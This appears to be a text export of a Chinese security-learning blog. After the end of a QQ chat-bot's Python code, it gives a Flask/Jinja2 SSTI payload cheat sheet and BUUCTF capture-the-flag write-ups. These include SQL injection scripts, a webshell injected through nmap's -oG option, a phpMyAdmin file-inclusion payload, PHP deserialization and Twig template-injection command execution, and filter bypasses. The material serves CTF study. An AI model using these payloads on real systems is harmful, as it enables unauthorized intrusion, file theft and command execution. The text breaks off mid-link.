json.dump(bottle,f)\n        return f\"biu～～～瓶子被扔走啦，坐等被人打捞吧～～～\"\n    except:\n        return \"扔瓶子失败了，请检查内容格式是否为：\\n扔瓶子 发送者（可填匿名） 接受者（可填空） 内容\"\ndef getBottle(uid):\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)      \n    with open('bottle.json','r') as f:\n        bottle = json.load(f)\n    num=random.randint(0,len(bottle)-1)\n    nb=bottle[num]\n    bottle.remove(nb)\n    try:\n        myBottles[str(uid)].append(nb)\n    except:\n        myBottles[str(uid)]=[nb]\n    with open('bottle.json','w') as f:\n        json.dump(bottle,f)\n    with open('myBottles.json','w') as f:\n        json.dump(myBottles,f)\n    return f\"{nb['send']}扔给了{nb['rec']}一个瓶子，内容是：{nb['con']}\"\ndef myBottles(uid):\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)\n    try:\n        myBottles[str(uid)]\n    except:\n        return \"您还没有瓶子呢，快去捞瓶子吧～～～\"\n    me=\"\"\n    for i in myBottles[str(uid)]:\n        me+=f\"{i['send']}扔给了{i['rec']}一个瓶子，内容是：{i['con']}\\n\"\n    return f\"[CQ:at,qq={uid}]您的瓶子有：\\n{me}\"\ndef cleanBottles(message,uid):\n    num=message.split(\" \")[1]\n    with open('myBottles.json','r') as f:\n        myBottles = json.load(f)\n    try:\n        myBottles[str(uid)]\n    except:\n        return f\"[CQ:at,qq={uid}]您还没有瓶子呢，快去捞瓶子吧～～～\"\n    try:\n        nb=myBottles[str(uid)].pop(int(num)-1)\n        with open('myBottles.json','w') as f:\n            json.dump(myBottles,f)\n        return f\"[CQ:at,qq={uid}]您摔碎了{nb['send']}扔给{nb['rec']}一个瓶子，内容是：{nb['con']}\"\n    except:\n        return f\"[CQ:at,qq={uid}]您还没有这个瓶子，快去捞一个吧\"\n\n\ndef keywordForGroup(message, gid, uid,nick,role):\n    if isBan(gid,uid) and not isAdmin(gid,uid):\n        return\n    if message[0:2]=='天气':\n        group.sendMessage(weather(message),gid)\n    elif message[0:2]=='运势':\n        group.sendMessage(today(message),gid)\n    elif message==\"积分\":\n        group.sendMessage(point(gid,uid),gid)\n    elif message[0:4]==\"听他的话\" and uid==405454586:\n        group.sendMessage(giveAdmin(gid,getQQ(message)),gid)\n    elif message[0:3]=='ban' and isAdmin(gid,uid):\n        group.sendMessage(ban(gid,getQQ(message)),gid)\n    elif message[0:5]=='unban' and isAdmin(gid,uid):\n        group.sendMessage(unban(gid,getQQ(message)),gid)\n    elif message=='/help':\n        group.sendMessage(help(),gid)\n    elif message[0:3]=='双色球':\n        group.sendMessage(theDoubleChromosphere(uid),gid)\n    elif message==\"签到\":\n        group.sendMessage(sign(gid,uid,nick),gid)\n    elif message==\"捞瓶子\":\n        group.sendMessage(getBottle(uid),gid)\n    elif message==\"我的瓶子\":\n        group.sendMessage(myBottles(uid),gid)\n    elif message[0:3]==\"摔瓶子\":\n        group.sendMessage(cleanBottles(message,uid),gid)\n    elif message==\"无内鬼\":\n        group.sendMessage(f\"[CQ:at,qq={uid}]穿件衣服吧你！你自己不恶sin吗？\",gid)\n    if re.search(r\"[\\(\\)（）]\",message):\n        group.sendMessage(buquan(message,uid),gid)\ndef keywordForPerson(message,uid):\n    if message[0:3]==\"扔瓶子\":\n        person.sendMessage(throwBottle(uid,message),uid)\n```\n\n```python\n#group.py\nimport json\nimport requests\n\n#保存用户信息\ndef saveGroupUserInfo(userInfo):\n    with open('userInfoOfGroup.json','w') as f:\n        json.dump(userInfo,f)\n#读取用户信息\ndef readGroupUserInfo():\n    with open('userInfoOfGroup.json','r') as f:\n        userInfo = json.load(f)\n    return userInfo\n#发送信息\ndef sendMessage(message,gid):\n    url=\"http://127.0.0.1:5700/send_msg?group_id=\"+str(gid)+\"&message=\"+message\n    requests.get(url)\n```\n\n","tags":["python"]},{"title":"SSTI","url":"/posts/25374.html","content":"\n### **Python中有用的魔术方法**\n\n```python\n__class__           查看对象所在的类\n__mro__             查看继承关系和调用顺序，返回元组\n__base__            返回基类\n__bases__           返回基类元组\n__subclasses__()    返回子类列表\n__init__            调用初始化函数，可以用来跳到__globals__\n__globals__         返回函数所在的全局命名空间所定义的全局变量，返回字典\n__builtins__        返回内建内建名称空间字典\n__dic__              类的静态函数、类函数、普通函数、全局变量以及一些内置的属性都是放在类的__dict__里\n__getattribute__()   实例、类、函数都具有的__getattribute__魔术方法。事实上，在实例化的对象进行.操作的时候（形如:a.xxx/a.xxx()）\t\t都会自动去调用__getattribute__方法。因此我们同样可以直接通过这个方法来获取到实例、类、函数的属性。\n__getitem__()        调用字典中的键值，其实就是调用这个魔术方法，比如a['b']，就是a.__getitem__('b')\n__builtins__         内建名称空间，内建名称空间有许多名字到对象之间映射，而这些名字其实就是内建函数的名称，对象就是这些内建函数本身。即里面有很多常用的函数。__builtins__与__builtin__的区别就不放了，百度都有。\n__import__           动态加载类和函数，也就是导入模块，经常用于导入os模块，__import__('os').popen('ls').read()\n__str__()            返回描写这个对象的字符串，可以理解成就是打印出来。\nurl_for              flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app\nget_flashed_messages flask的一个方法，可以用于得到__builtins__，而且url_for.__globals__['__builtins__']含有current_app\nlipsum               flask的一个方法，可以用于得到__builtins__，而且lipsum.__globals__含有os模块：{{lipsum.__globals__['os'].popen('ls').read()}}\n{{cycler.__init__.__globals__.os.popen('ls').read()}}\ncurrent_app          应用上下文，一个全局变量\nrequest              可以用于获取字符串来绕过，包括下面这些，引用一下羽师傅的。此外，同样可以获取open函数:request.__init__.__globals__['__builtins__'].open('/proc\\self\\fd/3').read()\nrequest.args.x1   \t get传参\nrequest.values.x1 \t 所有参数\nrequest.cookies      cookies参数\nrequest.headers      请求头参数\nrequest.form.x1   \t post传参\t(Content-Type:applicaation/x-www-form-urlencoded或multipart/form-data)\nrequest.data  \t\t post传参\t(Content-Type:a/b)\nrequest.json\t\t post传json  (Content-Type: application/json)\nconfig               当前application的所有配置。此外，也可以这样{{config.__class__.__init__.__globals__['os'].popen('ls').read()}}\n```\n\n### 代码块\n\n```\n变量块 {{}}\t用于将表达式打印到模板输出\n注释块 {##}\t注释\n控制块\t{%%}\t可以声明变量，也可以执行语句\n行声明\t##\t\t可以有和{%%}相同的效果\n```\n\n### 常用的过滤器\n\n```\nint()：将值转换为int类型；\nfloat()：将值转换为float类型；\nlower()：将字符串转换为小写；\nupper()：将字符串转换为大写；\ntitle()：把值中的每个单词的首字母都转成大写；\ncapitalize()：把变量值的首字母转成大写，其余字母转小写；\ntrim()：截取字符串前面和后面的空白字符；\nwordcount()：计算一个长字符串中单词的个数；\nreverse()：字符串反转；\nreplace(value,old,new)： 替换将old替换为new的字符串；\ntruncate(value,length=255,killwords=False)：截取length长度的字符串；\nstriptags()：删除字符串中所有的HTML标签，如果出现多个空格，将替换成一个空格；\nescape()或e：转义字符，会将<、>等符号转义成HTML中的符号。显例：content|escape或content|e。\nsafe()： 禁用HTML转义，如果开启了全局转义，那么safe过滤器会将变量关掉转义。示例： {{'<em>hello</em>'|safe}}；\nlist()：将变量列成列表；\nstring()：将变量转换成字符串；\njoin()：将一个序列中的参数值拼接成字符串。示例看上面payload；\nabs()：返回一个数值的绝对值；\nfirst()：返回一个序列的第一个元素；\nlast()：返回一个序列的最后一个元素；\nformat(value,arags,*kwargs)：格式化字符串。比如：{{ \"%s\" - \"%s\"|format('Hello?',\"Foo!\") }}将输出：Helloo? - Foo!\nlength()：返回一个序列或者字典的长度；\nsum()：返回列表内数值的和；\nsort()：返回排序后的列表；\ndefault(value,default_value,boolean=false)：如果当前变量没有值，则会使用参数中的值来代替。示例：name|default('xiaotuo')----如果name不存在，则会使用xiaotuo来替代。boolean=False默认是在只有这个变量为undefined的时候才会使用default中的值，如果想使用python的形式判断是否为false，则可以传递boolean=true。也可以使用or来替换。\nlength()返回字符串的长度，别名是count\n```\n\n### **Flask的一些全局变量 && 关键字**\n\n```python\n{{config}}\n{{requests}}\n{{requests.environ}}\n{{self}}\n{{url_for}}\n{{get_flashed_messages}}\n{{url_for.__globals__[\"os\"].system('calc')}}\n```\n\n### 常用payload\n\n```\n>>>''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()\n>>>''.__class__.__mro__[2].__subclasses__()[71].__init__.__globals__['os'].system('ls')\n//想要获取命令执行结果可以在后面加上.read()\n>>>''.__class__.__mro__[1].__subclasses__()[71].__init__.__globals__['os'].popen('cat fl4g').read()\n \n--------------------------------\n \n>>>object.__subclasses__()[59].__init__.func_globals.linecache.os.popen('id').read()\n>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['eval'](\"__import__('os').popen('id').read()\")\n>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.eval(\"__import__('os').popen('id').read()\")\n>>>object.__subclasses__()[59].__init__.__globals__.__builtins__.__import__('os').popen('id').read()\n>>>object.__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('os').popen('id').read()\n \n--------------------------------\n{{''.__class__.__mro__[-1].__subclasses__()[200]('calc') }}\n其中的xxxx可以为任意字符\n{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.eval(\"__import__('os').popen('whoami').read()\") }}\n{{''.__class__.__mro__[-1].__subclasses__().xxxx.__init__.__globals__.__builtins__.exec(\"__import__('os').popen('calc').read()\") }} #本地测试不知道为什么执行whoami只会返回None\n\n```\n\n[拓展](https://dar1in9s.github.io/2020/09/15/ssti进阶/)\n\n\n\n","tags":["CTF","web"]},{"title":"BUUCTF记录","url":"/posts/42117.html","content":"\n## [极客大挑战 2019]HardSQL\n\n首先尝试输入点东西\n\n结果![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-13 22.14.07.png)\n\n尝试万能密码![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-13 22.14.34.png)\n\n跑一下看看都过滤了啥\n\n```\n该字符是非法字符: union\n该字符是非法字符: and\n该字符是非法字符: sleep\n该字符是非法字符: by\n该字符是非法字符: if\n该字符是非法字符: char\n该字符是非法字符: ascii\n该字符是非法字符: mid\n该字符是非法字符: substring\n该字符是非法字符: handler\n该字符是非法字符: benchmark\n该字符是非法字符: insert\n该字符是非法字符: *\n该字符是非法字符: =\n该字符是非法字符: \\\n该字符是非法字符: 空格\n```\n\n只能尝试报错注入了\n\n```\n1'or(updatexml(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#\n1'or(updatexml(1,concat(0x7e,(right((select(group_concat(password))from(H4rDsq1)),15)),0x7e),1))#\n```\n\n报错注入限制长度，用right函数切割\n\n\n\n\n\n## [CISCN2019 华北赛区 Day2 Web1]Hack World\n\n布尔盲注\n\n```python\nimport requests\nurl=\"http://40a6cf54-8382-490a-8651-8324677bb273.node4.buuoj.cn:81/index.php\"\nflagchar=\"flag{-abcdef1234567890}\"\nfor i in range(1,50):\n    for j in flagchar:\n        data={\n            'id':f\"if(ascii(substr((select(flag)from(flag)),{i},1))={ord(j)},2,1)\"\n        }\n        tex=requests.post(url=url,data=data).text\n        if \"Do you want to be my girlfriend\" in tex:\n            print(j,end=\"\")\n            break\n```\n\n## [GXYCTF2019]BabyUpload\n\n首先尝试上传php文件，被过滤，尝试png图片，过滤，只能上传jpeg了，成功\n\n发现服务器是apache服务器，尝试上传.htaccess文件\n\n```\nAddType application/x-httpd-php .jpeg\n```\n\n成功![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 20.14.17.png)\n\n成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 20.18.24.png)\n\n蚁剑链接即可\n\n## [BUUCTF 2018]Online Tool\n\n上来两个函数escapeshellarg()和escapeshellcmd()\n\n```\nescapeshellarg()将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含exec(),system()执行运算符。\n```\n\n```\nescapeshellcmd()对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到exec()或system()函数，或者执行操作符之前进行转义。反斜线（\\）会在以下字符之前插入：&#;`|*?~<>^()[]{}$,\\x0A和\\xFF。'和\"仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及%和!字符都会被空格代替。\n```\n\n两个函数使用的例子\n\n```\n原始输入 172.17.0.2' -v -d a=1\nescapeshellarg处理后 '172.17.0.2''' -v -d a=1'\nescapeshellcmd处理后 '172.17.0.2'\\'' -v -d a=1'\n```\n\n在本题中，使用的nmap有一个名为-oG的参数选项，可以将nmap的命令和执行结果写入文件\n\n```\npayload:?host=' <?php @eval($_POST[\"kkk\"]);?> -oG kkk.php '\n```\n\n传入后变为\n\n```\nnmap -T5 -sT -Pn --host-timeout 2 -F ''<?php @eval($_POST[\"kkk\"]);?> -oG kkk.php''\n```\n\n## [BJDCTF2020]The mystery of ip\n\nSSTI模版注入，以后学了在理解吧\n\n```\nX-Forwarded-For: {{system(\"cat /flag\")}}\n```\n\n\n\n## [RoarCTF 2019]Easy Calc\n\nPHP字符串解析漏洞，查看数据包访问calc.php\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 22.29.28.png)\n\n尝试传入scandir()扫描文件，发现WAF阻挡，将传入参数由num改为 num，php获取到的参数名称为num而WAF获取到 num，绕过WAF成功，扫描发现在根目录下有f1agg文件，使用file_get_content函数读取文件即可\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-14 22.35.38.png)\n\n\n\n## [网鼎杯 2018]Fakebook\n\n首先注册后进入，发现no疑似存在SQL注入，尝试union select被过滤，尝试union/**/select成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15 13.17.59.png)\n\n爆出回显位置，以及似乎网页对数据库内容进行了反序列化，稍后再看，先进行SQL注入爆出内容\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15 13.19.45.png)\n\n发现用户信息是被序列化后存储在数据库中的，下一步应当尝试查看源码进行反序列化了，访问robots.txt发现了网站源码，源码对用户传入的博客链接进行访问并渲染，直接将链接改为本地文件并渲染，得到flag\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-15 13.30.53.png)\n\n## [GXYCTF2019]禁止套娃\n\n首先看robots.txt发现没有内容，扫目录扫出.git，猜测有源码泄露，使用gitHack得到index.php\n\n```php\n//index.php\n<?php\ninclude \"flag.php\";\necho \"flag在哪里呢？<br>\";\nif(isset($_GET['exp'])){\n    if (!preg_match('/data:\\/\\/|filter:\\/\\/|php:\\/\\/|phar:\\/\\//i', $_GET['exp'])) {\n        if(';' === preg_replace('/[a-z,_]+\\((?R)?\\)/', NULL, $_GET['exp'])) {\n            if (!preg_match('/et|na|info|dec|bin|hex|oct|pi|log/i', $_GET['exp'])) {\n                // echo $_GET['exp'];\n                @eval($_GET['exp']);\n            }\n            else{\n                die(\"还差一点哦！\");\n            }\n        }\n        else{\n            die(\"再好好想想！\");\n        }\n    }\n    else{\n        die(\"还想读flag，臭弟弟！\");\n    }\n}\n// highlight_file(__FILE__);\n?>\n\n```\n\n第一步过滤了所有伪协议，只能执行函数了，下一步查看正则，大佬的解释如下\n\n```\n(?R)是引用当前表达式，(?R)? 这里多一个?表示可以有引用，也可以没有。，引用一次正则则变成了[a-z,_]+\\([a-z,_]+\\((?R)?\\)\\),可以迭代下去，那么它所匹配的就是print(echo(1))、a(b(c()));类似这种可以括号和字符组成的，这其实是无参数RCE比较典型的例子\n```\n\n最终我们就是要构造一个无参嵌套函数执行，首先尝试扫描文件，查看是否有flag文件存在\n\n知识点：localeconv函数返回一包含本地数字及货币格式信息的数组\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 22.15.48.png)\n\n通过这个函数第一项我们可以拿到.，进而可以使用scandir函数扫描目录文件\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 22.17.17.png)\n\n通过current取出第一位.，flag.php在倒数第二的位置，先使用array_reverse函数倒转排序，在使用next取第二位，使用hightlight_file读出文件\n\n```\npayload:?exp=highlight_file(next(array_reverse(scandir(current(localeconv())))));\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-20 22.19.48.png)\n\n## [GWCTF 2019]我有一个数据库\n\n进去就告诉你数据库是空的，先扫个文件吧，发现有robots.txt和/phpmyadmin/，先看robots，提示去phpinfo.php，就是个phpinfo页面，也没啥提示，看phpmyadmin，数据库里还真没东西\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-22 15.25.46.png)\n\n看WP，发现是一个关于phpmyadmin的远程文件包含漏洞[CVE-2018-12613](https://blog.csdn.net/qq_43579362/article/details/108476182)\n\n出现bug的代码位置：phpMyAdmin/index.php\n\n![](https://img-blog.csdnimg.cn/20200908202849454.png)\n\n可以看到传入的target需要满足的条件：\n\n1、是字符串\n\n2、没有index\n\n3、不`target_blacklist`中\n\n4、满足`Core`类中`checkPageValidity`函数检查\n\n最后一个条件的有关代码如下\n\n![](https://img-blog.csdnimg.cn/20200908203030418.png)\n\n上述函数可知，如果想要函数返回真，需要满足以下三个条件的任意一个\n\n1、`$page`变量值在`$white_list`数组中\n\n2、经过`mb_substr()`和`mb_strpos()`处理的`$page–>$_page`的变量值在`$_whitelist`数组中，\n\n3、经过`urldecode(),mb_substr(),mb_strpos()`处理的`$page–>$_page`的变量值在`$_whitelist`数组中，\n\n![](https://img-blog.csdnimg.cn/20200908204934607.png)\n\n开始构造payload，先挑一个在whitelist中的文件db_datadict.php然后加问号和我们想要包含的文件\n\n```\npayload:?target=db_datadict.php%253f/../../../../../../../../../flag\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-22 15.45.08.png)\n\n## [网鼎杯 2020 朱雀组]phpweb\n\n打开网站查看源码，发现有一个延时5秒提交的参数，抓包查看参数名称发现可能是执行函数的东西，尝试highlight_file读取页面源码成功\n\n```php+HTML\n<?php\n    $disable_fun = array(\"exec\",\"shell_exec\",\"system\",\"passthru\",\"proc_open\",\"show_source\",\"phpinfo\",\"popen\",\"dl\",\"eval\",\"proc_terminate\",\"touch\",\"escapeshellcmd\",\"escapeshellarg\",\"assert\",\"substr_replace\",\"call_user_func_array\",\"call_user_func\",\"array_filter\", \"array_walk\",  \"array_map\",\"registregister_shutdown_function\",\"register_tick_function\",\"filter_var\", \"filter_var_array\", \"uasort\", \"uksort\", \"array_reduce\",\"array_walk\", \"array_walk_recursive\",\"pcntl_exec\",\"fopen\",\"fwrite\",\"file_put_contents\");\n    function gettime($func, $p) {\n        $result = call_user_func($func, $p);\n        $a= gettype($result);\n        if ($a == \"string\") {\n            return $result;\n        } else {return \"\";}\n    }\n    class Test {\n        var $p = \"Y-m-d h:i:s a\";\n        var $func = \"date\";\n        function __destruct() {\n            if ($this->func != \"\") {\n                echo gettime($this->func, $this->p);\n            }\n        }\n    }\n    $func = $_REQUEST[\"func\"];\n    $p = $_REQUEST[\"p\"];\n\n    if ($func != null) {\n        $func = strtolower($func);\n        if (!in_array($func,$disable_fun)) {\n            echo gettime($func, $p);\n        }else {\n            die(\"Hacker...\");\n        }\n    }\n    ?>\n```\n\n过滤了大部分危险函数，继续看发现有一个Test类在销毁时会执行函数，可通过反序列化绕过函数禁用\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-23 00.33.29.png)\n\n尝试构造成功，但没有发现flag，搜索一下发现在/tmp/flagoefiu4r93\n\n```\npayload:\nPOST\nfunc=unserialize&p=O:4:\"Test\":2:{s:1:\"p\";s:22:\"tac /tmp/flagoefiu4r93\";s:4:\"func\";s:6:\"system\";}\n```\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-23 00.36.23.png)\n\n## [BSidesCF 2020]Had a bad day\n\n选猫猫或狗狗后url中出现注入点，尝试读取文件\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-25 23.42.45.png)\n\n似乎会自动补后缀，去掉.php，读取源码\n\n```php+HTML\n<?php\n\t$file = $_GET['category'];\n\tif(isset($file))\n\t{\n\t\tif( strpos( $file, \"woofers\" ) !==  false || strpos( $file, \"meowers\" ) !==  false || strpos( $file, \"index\"))\n    {\n\t\t\tinclude ($file . '.php');\n\t\t}\n\t\telse{\n\t\t\techo \"Sorry, we currently only support woofers and meowers.\";\n\t\t}\n\t}\n?>\n```\n\n包含的条件是参数中有woofers，meowers或者index，任选一个构造payload，再使用过滤器base64编码就可以\n\n```\npayload:?category=php://filter/convert.base64-encode/resource=index/../flag\n```\n\n## [BJDCTF2020]Mark loves cat\n\n啥也没有先扫吧，扫出.git，githack跑一下，看源码\n\n```PHP\n//index.php\n<?php\n\n$flag = file_get_contents('/flag');\n\n$yds = \"dog\";\n$is = \"cat\";\n$handsome = 'yds';\n\nforeach($_POST as $x => $y){\n    $$x = $y;\n}\n\nforeach($_GET as $x => $y){\n    $$x = $$y;\n}\n\nforeach($_GET as $x => $y){\n    if($_GET['flag'] === $x && $x !== 'flag'){\n        exit($handsome);\n    }\n}\n\nif(!isset($_GET['flag']) && !isset($_POST['flag'])){\n    exit($yds);\n}\n\nif($_POST['flag'] === 'flag'  || $_GET['flag'] === 'flag'){\n    exit($is);\n}\n\necho \"the flag is: \".$flag;\n```\n\n用第二个判断，$yds=$flag即可\n\n```\npayload:?yds=flag\n```\n\n## [强网杯 2019]高明的黑客\n\n下载源码，3000个文件，打开看内容中有许多eval函数，但是执行时内容不一定可用，编写脚本进行测试\n\n```python\nimport os\nimport requests\nimport re\npath=\"C:\\phpstudy_pro\\WWW\\src\\\\\"\nfiles=os.listdir(path)\nprint(path)\nfor i in files:\n    try:\n        with open(path+i,'r') as f:\n            gets = list(re.findall('\\$_GET\\[\\'(.*?)\\'\\]', f.read()))\n            posts = list(re.findall('\\$_POST\\[\\'(.*?)\\'\\]', f.read()))\n    except:\n        continue\n    data={}\n    parm={}\n    for j in gets:\n        parm[j]=\"echo 'jlanhere';\"\n    for j in posts:\n        data[j] = \"echo 'jlanhere';\"\n    tex=requests.post(url=f\"http://src/{i}\",data=data,params=parm).text\n    if \"jlanhere\" in tex:\n        tp={}\n        for k in gets:\n            tp = {}\n            tp[k] = \"echo 'jlanhere';\"\n            textt = requests.get(url=f\"http://src/{i}\",params=tp).text\n            if \"jlanhere\" in textt:\n                print(\"get\")\n                print(i)\n                print(k)\n                exit()\n        for k in posts:\n            tp = {}\n            tp[k] = \"echo 'jlanhere';\"\n            textt = requests.post(url=f\"http://src/{i}\",data=tp).text\n            if \"jlanhere\" in textt:\n                print(\"post\")\n                print(i)\n                print(k)\n                exit()\n```\n\n找出一个注入点\n\n```\npayload:\nxk0SzyKwfzw.php?Efa5BVG=cat /flag\n```\n\n拿到flag\n\n## [安洵杯 2019]easy_web\n\n看看传参，img的内容是被hex编码后再用两次base64编码得到的，解码内容如下\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-26 23.02.28.png)\n\n尝试将index.php编码传入，得到源码\n\n```php+html\n<?php\nerror_reporting(E_ALL || ~ E_NOTICE);\nheader('content-type:text/html;charset=utf-8');\n$cmd = $_GET['cmd'];\nif (!isset($_GET['img']) || !isset($_GET['cmd'])) \n    header('Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&cmd=');\n$file = hex2bin(base64_decode(base64_decode($_GET['img'])));\n\n$file = preg_replace(\"/[^a-zA-Z0-9.]+/\", \"\", $file);\nif (preg_match(\"/flag/i\", $file)) {\n    echo '<img src =\"./ctf3.jpeg\">';\n    die(\"xixi～ no flag\");\n} else {\n    $txt = base64_encode(file_get_contents($file));\n    echo \"<img src='data:image/gif;base64,\" . $txt . \"'></img>\";\n    echo \"<br>\";\n}\necho $cmd;\necho \"<br>\";\nif (preg_match(\"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\\'|\\\"|\\`|;|,|\\*|\\?|\\\\|\\\\\\\\|\\n|\\t|\\r|\\xA0|\\{|\\}|\\(|\\)|\\&[^\\d]|@|\\||\\\\$|\\[|\\]|{|}|\\(|\\)|-|<|>/i\", $cmd)) {\n    echo(\"forbid ~\");\n    echo \"<br>\";\n} else {\n    if ((string)$_POST['a'] !== (string)$_POST['b'] && md5($_POST['a']) === md5($_POST['b'])) {\n        echo `$cmd`;\n    } else {\n        echo (\"md5 is funny ~\");\n    }\n}\n\n?>\n```\n\n直接看关键，md5强相等绕过\n\n```\na=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2&b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2\n或\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n```\n\n然后就是命令绕过，使用反斜杠绕过cat\n\n```\npayload:?cmd=ca\\t /flag\nPOST:\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n```\n\n## [BJDCTF2020]Cookie is so stable\n\n直接测试出SSTI，但是这个渲染框架不是flask的，灰溜溜去看wp，发现是php的twig渲染模版，直接在cookie处放payload即可\n\n```\npayload:\nCookie: user={{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"cat /flag\")}}\n```\n\n## [WUSTCTF2020]朴实无华\n\nrobots.txt->fAke_f1agggg.php->fl4g.php\n\n```PHP\n<?php \nheader('Content-type:text/html;charset=utf-8'); \nerror_reporting(0); \nhighlight_file(__file__); \n\n\n//level 1 \nif (isset($_GET['num'])){ \n    $num = $_GET['num']; \n    if(intval($num) < 2020 && intval($num + 1) > 2021){ \n        echo \"我不经意间看了看我的劳力士, 不是想看时间, 只是想不经意间, 让你知道我过得比你好.</br>\"; \n    }else{ \n        die(\"金钱解决不了穷人的本质问题\"); \n    } \n}else{ \n    die(\"去非洲吧\"); \n} \n//level 2 \nif (isset($_GET['md5'])){ \n   $md5=$_GET['md5']; \n   if ($md5==md5($md5)) \n       echo \"想到这个CTFer拿到flag后, 感激涕零, 跑去东澜岸, 找一家餐厅, 把厨师轰出去, 自己炒两个拿手小菜, 倒一杯散装白酒, 致富有道, 别学小暴.</br>\"; \n   else \n       die(\"我赶紧喊来我的酒肉朋友, 他打了个电话, 把他一家安排到了非洲\"); \n}else{ \n    die(\"去非洲吧\"); \n} \n\n//get flag \nif (isset($_GET['get_flag'])){ \n    $get_flag = $_GET['get_flag']; \n    if(!strstr($get_flag,\" \")){ \n        $get_flag = str_ireplace(\"cat\", \"wctf2020\", $get_flag); \n        echo \"想到这里, 我充实而欣慰, 有钱人的快乐往往就是这么的朴实无华, 且枯燥.</br>\"; \n        system($get_flag); \n    }else{ \n        die(\"快到非洲了\"); \n    } \n}else{ \n    die(\"去非洲吧\"); \n} \n?> \n```\n\n首先intval函数特性\n\n```\nintval('2e4')=2\nintval('2e4'+1)=20001\n因为在执行下面的命令时相当于先执行了int('2e4')=20000再加一\n所以第一个绕过num=2e4即可\n```\n\n第二个md5弱相等绕过\n\n```\n$md5=md5($md5)\n开头是0e并且md5后也是0e即可\n0e215962017\n```\n\n最后空格绕过和cat绕过\n\n```\npayload:fl4g.php?num=2e4&md5=0e215962017&get_flag=tac${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n```\n\n## [护网杯 2018]easy_tornado\n\n进去三个文件\n\n```\n/flag.txt：flag in /fllllllllllllag\n/welcome.txt：render\n/hints.txt：md5(cookie_secret+md5(filename))\n```\n\n点击文件查看链接传参，很明显是文件名和对应的`md5(cookie_secret+md5(filename))`所以我们需要找到`cookie_secret`这一变量的值，再看welcome中有render，怀疑是SSTI，更改传参内容，出现error页面，测试SSTI成功\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/截屏2022-04-28 